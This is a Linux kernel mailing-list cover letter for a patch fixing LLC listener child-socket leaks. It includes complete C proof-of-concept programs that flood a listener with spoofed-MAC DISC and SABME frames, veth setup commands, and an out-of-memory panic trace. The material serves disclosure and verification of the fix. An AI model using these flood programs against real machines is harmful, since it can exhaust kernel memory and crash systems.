Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9E48E4582FF
	for <netdev@vger.kernel.org>; Thu, 24 Sep 2026 16:32:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790267548; cv=none; b=EETEj+Hx6KfMHjehA8n0R8LMopSV9fkDPWWqrTvmXkmIe8LcokasVqsS2P9sHpRdv0ItmiepLWZyLr8XuZTFvrHOwOlm36uAKI92pSRlvEZJhBQgoSrm1GkxBNIF22zgJz9Nl7N6w6luU0RFWLp9RU3vLWOug0DjvX8VWABGLz0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790267548; c=relaxed/simple;
	bh=Jk0eTJ44iTL1b2NbklUozZz0fG6GEdAhdF+Xk7zgCSA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Vgntt0q4cC51o1Va2lYNM8a3fwr3PAAfGuSb49d62qrucgx8sQ74FUgkWB6Q8rCxQoX2HvYeHy3Il/vuJBFPDehX/4qvMjln/ASDr6gpicqAQUw6CtED5fKzqguRzXnT+vaVjpC5nc9bI8YicdVTcKpPqjxHBBopdnjZybomFH8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=MvNRLki8; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="MvNRLki8"
Received: by mail-pj2-f13.google.com with SMTP id d9443c01a7336-2d93ff61046so13207765ad.3
        for <netdev@vger.kernel.org>; Thu, 24 Sep 2026 09:32:25 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790267545; x=1790872345; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=lnDRw6TMJgYXW2z6V0+qhtudGvu8DOKD4yKUmhuCJ0w=;
        b=MvNRLki8VomMPda1OAzuI9NosdxbGDoNbs5WlUEZQN+vt4s8VJINtegT6c36jBuTJm
         u6Urx2HczJVnhRrZTIxAgE1CzkTS30NwykKcBbWiOe0P7LY7ZwCNkx6AcddWfmQWU3nF
         46VlK8bNpSUI+5e1zsRwleQk8wOF3TzwZGYyi2jOl92+xeKXN+9P2/zm5WspI9p76cSz
         Ltj0dgAB03koGFqrAiqMZLgDwhfK54PuzVpNBHsmJ25IPbiUepWDXSnexEdQjo4lOd+h
         qUnfizQBdNBm+9HgwA0wsEDxJt7MqPi6r83/v6RYXKt9mqag9jvLYsu39zAly5i+86UX
         nSrw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790267545; x=1790872345;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=lnDRw6TMJgYXW2z6V0+qhtudGvu8DOKD4yKUmhuCJ0w=;
        b=V5Df8emY8Eq0surFQaZnW1hM7IHQlIpR3XwjdOyAOF9ek3IPz6OiiDLvoJX3aRCD5Y
         IJyAMxQh2WfpoFLIyebBNiBPGsISfZcDOOLxDTNC0YspwJWpMHW4z+QMXEd2h+P/Z5O1
         l7WIxlb1pRmrBm3I/fEoEMndkXGyTrdkXc9YLs099u7XkIWj332sNaiSI3gAoxr1CbiC
         uX7uqi/HkZZ4rpZp0vMOnoiK0xllsJlv0Hq7A0yVL4z8n27QvJFd9t5/3ehKLYp+H4AL
         HioUj7+oQqdrlDun3LjnhMfr0LHGZMpW6m6xy0sg5vmmGPhJA1fh2iomPKbDPFuQKy29
         uqhw==
X-Gm-Message-State: AFuF++m9DfEKCejki6jHH4UZlgrun8+4KJL+/KtF26TM79FfUa7ck9rF
	5o2XpoOxZDSDEj05NPfLhTkGneRYRK3wweDdU19VndpvsOfGtBGNEDbl3SRYyDh+fW88Srs9TU8
	3whEk0YuZ
X-Gm-Gg: AYBFou0nBGDbyYD10B7HDa5AFaWUKEl0rZUOU7ZexPL7KwMBDiBJi5KfJDPtqHxl/ON
	Qcq+Cusl557mZxh3V08Skk0dLDBccLWm758eyG5R7awdc+0aSVTzCPBcsSNWWNvfxDBOStPpyV9
	dPNLXcTG22+CO0MxgKN3muDPO0CnU8+2bj/M86grybo/dBJfo22Rdj4xgYmTbrnB6lV4EBNwuxU
	TXH/7oUa75ZYW8Lgy5TyPA2wb/Gjra8GR/BG2hjG90mwK7J2WdeXVqXHAuFN6i2AWVcMFGGQldX
	k22dkSmhtlsEkOCX5/7Z686ya3UxGfG9IbShNObWq/GjcBmBlCOjojUV1+CIAjvvx7tjLqoIF/K
	KgE91CdVS8VPsKtTzFTI5c2tsBuXyDJSbWmespcrxWPY/rkAqrMsmIBmRmi0bJY/R8WsysuaqFO
	SAC22fr4E1LZ58ZPSYKn6Hnm/10zuEPyW7/wlkkVYfL0lz0nl39URlZZwNuJixHyZXq8bsIaNox
	qZXIwDmtHxU5nPI7XLinle1sx4IsPA=
X-Received: by 2002:a17:902:ce0c:b0:2dd:c054:197b with SMTP id d9443c01a7336-2df7e11d071mr26568705ad.32.1790267544310;
        Thu, 24 Sep 2026 09:32:24 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2df6a5eea15sm30365205ad.64.2026.09.24.09.32.20
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 24 Sep 2026 09:32:23 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: zihanx@nebusec.ai,
	linux-kernel@vger.kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org
Subject: [PATCH net v12 0/1] llc: fix listener child socket leaks
Date: Thu, 24 Sep 2026 16:32:10 +0000
Message-ID: <cover.1790255682.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi netdev,

The affected file is net/llc/llc_conn.c. The change is limited to
listener-side frame classification and admission/lifetime handling for
unaccepted passive-open children. Established LLC sockets continue
through the existing receive path.

---- details below ----

Bug details:

llc_conn_handler() created and published a child socket for any frame
matching a listener. Non-SABME frames cannot complete passive open, so
the resulting children stayed in the SAP hash with SAP and device
references held.
SABME children could also be stranded if backlog admission, state-machine
processing or listener teardown failed. Their indications were not
counted against the accept backlog.

The patch creates children only for SABME, replies to DISC and other
P=3D1 commands from the listener, and drops other non-SABME frames. It
accounts indications against the accept backlog, ties unaccepted-child
cleanup to the indication skb, and holds skb->dev while a frame waits in
backlog. A deferred SABME that drains after the listener leaves
TCP_LISTEN is dropped before the state machine can dereference its unset
skb->sk.

The child-publication behavior dates to 1da177e4c3f4
("Linux-2.6.12-rc2"); d389424e00f9 ("[LLC]: Fix the accept path")
retained it. Fixes therefore points to the original commit.

Validation status

The final v12 patch, including the ownerless-backlog guard, built
successfully. SABME accept/close, accept-backlog and a 110000-frame
DISC flood passed in a 2-vCPU, 2-GB x86 QEMU guest. After the flood,
/proc/net/llc/socket contained only its header; the log ended with
LLC_POC_DONE and had no BUG, Oops or panic (KASAN was not enabled).
The tests did not directly exercise a deferred SABME drained after the
listener leaves TCP_LISTEN, or the net_device-unregister race.

The OOM log below is separate evidence from an unfixed Linux v6.12.74
guest. There, panic_on_oom=3D2 made exhaustion fatal during a DISC flood;
that setting is not needed to trigger the leak. The trace was decoded
with the matching v6.12.74 vmlinux.

Access and test setup

PF_LLC sockets are restricted to init_net. Local testing ran as root to
create a veth pair. On an existing interface, the receive trigger needs
CAP_NET_RAW, not CAP_NET_ADMIN; changing panic_on_oom for the separate
OOM run also requires privilege. packetdrill cannot express both a
PF_LLC listener/accept lifecycle and AF_PACKET Ethernet injection with
rotating source MACs, so the reproducer uses C programs.

Reproducer

Build the programs from the bug directory. Create the veth pair once
(requires CAP_NET_ADMIN), then run each test in init_net with CAP_NET_RAW:

    gcc -O2 -static -Wall -Wextra -o poc poc.c
    gcc -O2 -static -Wall -Wextra -o poc-sabme poc-sabme.c
    gcc -O2 -static -Wall -Wextra -o poc-backlog verify/poc-backlog.c
    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc-sabme accept llc_rx0 llc_tx0
    ./poc-sabme close llc_rx0 llc_tx0 100
    ./poc-backlog llc_rx0 llc_tx0 1 10
    ./poc llc_rx0 llc_tx0 100
    wc -l /proc/net/llc/socket

For the unfixed-kernel OOM evidence, use a fresh unfixed guest after
compiling the PoC and setting up the veth pair. As root, set
panic_on_oom before the long DISC flood:

    # fresh unfixed guest
    echo 2 > /proc/sys/vm/panic_on_oom
    ./poc llc_rx0 llc_tx0 110000=0D
=0D
------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd =3D socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd =3D socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac=
[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd =3D socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one =3D 1;
	int ifindex =3D get_ifindex(ifname);

	fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out =3D ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if =3D DEFAULT_RX_IF;
	const char *tx_if =3D DEFAULT_TX_IF;
	uint64_t count =3D 0;
	uint64_t i =3D 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if =3D argv[1];
	if (argc > 2)
		tx_if =3D argv[2];
	if (argc > 3) {
		char *end =3D NULL;

		errno =3D 0;
		count =3D strtoull(argv[3], &end, 0);
		if (errno || !end || *end !=3D '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd =3D make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd =3D make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto =3D htons(3);
	frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
	frame[ETH_HLEN + 1] =3D 0x04;
	frame[ETH_HLEN + 2] =3D 0x43; /* DISC command, P/F=3D0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_ifindex =3D ifindex;
	sll.sll_halen =3D ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=3D%s sender_if=3D%s sap=3D0x%02x count=3D%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=3D%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <=3D count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=3D%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

------BEGIN poc-sabme.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac=
[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd =3D socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one =3D 1;
	int ifindex =3D get_ifindex(ifname);
	int fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out =3D ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[=
ETH_ALEN],
		       const unsigned char src[ETH_ALEN])
{
	static unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto =3D htons(3);
	frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
	frame[ETH_HLEN + 1] =3D 0x04;
	frame[ETH_HLEN + 2] =3D SABME_CMD;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_ifindex =3D ifindex;
	sll.sll_halen =3D ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
}

int main(int argc, char **argv)
{
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	const char *mode;
	const char *rx_if =3D DEFAULT_RX_IF;
	const char *tx_if =3D DEFAULT_TX_IF;
	uint64_t count =3D 1;
	uint64_t i;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	mode =3D argv[1];
	if (argc > 2)
		rx_if =3D argv[2];
	if (argc > 3)
		tx_if =3D argv[3];
	if (argc > 4) {
		char *end =3D NULL;

		errno =3D 0;
		count =3D strtoull(argv[4], &end, 0);
		if (errno || !end || *end !=3D '\0' || !count) {
			fprintf(stderr, "invalid count: %s\n", argv[4]);
			return EXIT_FAILURE;
		}
	}

	listener_fd =3D make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd =3D make_packet_socket(tx_if, &ifindex);
	fprintf(stderr, "mode=3D%s listener_if=3D%s sender_if=3D%s count=3D%llu\n",
		mode, rx_if, tx_if, (unsigned long long)count);

	if (!strcmp(mode, "accept")) {
		int child;
		struct sockaddr_llc addr;
		socklen_t addrlen =3D sizeof(addr);
		struct timeval tv =3D { .tv_sec =3D 5, .tv_usec =3D 0 };

		fill_src_mac(src_mac, 1);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		child =3D accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
		if (child < 0)
			die_errno("accept(AF_LLC)");
		printf("SABME passive open accepted\naccept_rc=3D0\n");
		close(child);
		close(packet_fd);
		close(listener_fd);
		return 0;
	}

	if (!strcmp(mode, "close")) {
		for (i =3D 1; i <=3D count; i++) {
			fill_src_mac(src_mac, i);
			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
				src_mac[ETH_ALEN - 1] ^=3D 1;
			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		}
		close(packet_fd);
		close(listener_fd);
		printf("SABME sent without accept and listener closed\n");
		return 0;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc-sabme.c--------

------BEGIN poc-backlog.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd =3D socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int llc_socket_count(void)
{
	FILE *fp =3D fopen("/proc/net/llc/socket", "r");
	char line[256];
	int count =3D 0;

	if (!fp)
		return -1;
	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}
	while (fgets(line, sizeof(line), fp))
		count++;
	fclose(fp);
	return count;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] =3D 0x02;
	mac[1] =3D (n >> 32) & 0xff;
	mac[2] =3D (n >> 24) & 0xff;
	mac[3] =3D (n >> 16) & 0xff;
	mac[4] =3D (n >> 8) & 0xff;
	mac[5] =3D n & 0xff;
}

int main(int argc, char **argv)
{
	const char *rx_if =3D argc > 1 ? argv[1] : "llc_rx0";
	const char *tx_if =3D argc > 2 ? argv[2] : "llc_tx0";
	int backlog =3D argc > 3 ? atoi(argv[3]) : 1;
	int nframes =3D argc > 4 ? atoi(argv[4]) : 10;
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_llc addr;
	struct sockaddr_ll sll;
	static unsigned char frame[ETH_ZLEN];
	int listener_fd, packet_fd, ifindex, one =3D 1, i, after_send, after_close;
	int expected_max;

	listener_fd =3D socket(AF_LLC, SOCK_STREAM, 0);
	if (listener_fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(rx_if, dst_mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family =3D AF_LLC;
	addr.sllc_arphrd =3D ARPHRD_ETHER;
	addr.sllc_sap =3D DEFAULT_SAP;
	memcpy(addr.sllc_mac, dst_mac, ETH_ALEN);
	if (bind(listener_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(listener_fd, backlog) < 0)
		die_errno("listen(AF_LLC)");

	ifindex =3D get_ifindex(tx_if);
	packet_fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (packet_fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(packet_fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family =3D AF_PACKET;
	sll.sll_protocol =3D htons(ETH_P_ALL);
	sll.sll_ifindex =3D ifindex;
	if (bind(packet_fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	for (i =3D 1; i <=3D nframes; i++) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^=3D 1;
		memset(frame, 0, sizeof(frame));
		memcpy(frame, dst_mac, ETH_ALEN);
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
		((struct ethhdr *)frame)->h_proto =3D htons(3);
		frame[ETH_HLEN + 0] =3D DEFAULT_SAP;
		frame[ETH_HLEN + 1] =3D 0x04;
		frame[ETH_HLEN + 2] =3D SABME_CMD;
		memset(&sll, 0, sizeof(sll));
		sll.sll_family =3D AF_PACKET;
		sll.sll_ifindex =3D ifindex;
		sll.sll_halen =3D ETH_ALEN;
		memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");
	}
	usleep(200000);
	after_send =3D llc_socket_count();
	/* TCP-style: sk_acceptq_is_full() is >, so listen(N) can hold N+1. */
	expected_max =3D 1 + backlog + 1;
	printf("listen_backlog=3D%d sabme_sent=3D%d llc_sockets_open=3D%d expected=
_max=3D%d\n",
	       backlog, nframes, after_send, expected_max);
	if (after_send < 1 || after_send > expected_max) {
		fprintf(stderr, "FAIL: open socket count %d not in 1..%d\n",
			after_send, expected_max);
		return EXIT_FAILURE;
	}
	close(packet_fd);
	close(listener_fd);
	usleep(200000);
	after_close =3D llc_socket_count();
	printf("llc_sockets_after_close=3D%d\n", after_close);
	if (after_close !=3D 0) {
		fprintf(stderr, "FAIL: leftover sockets after close: %d\n",
			after_close);
		return EXIT_FAILURE;
	}
	printf("backlog_rc=3D0\n");
	return 0;
}
------END poc-backlog.c--------

----BEGIN crash log----
Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabl=
ed

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.=
74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3=
))=20

[1665.707568][T10284] panic (kernel/panic.c:611)=20

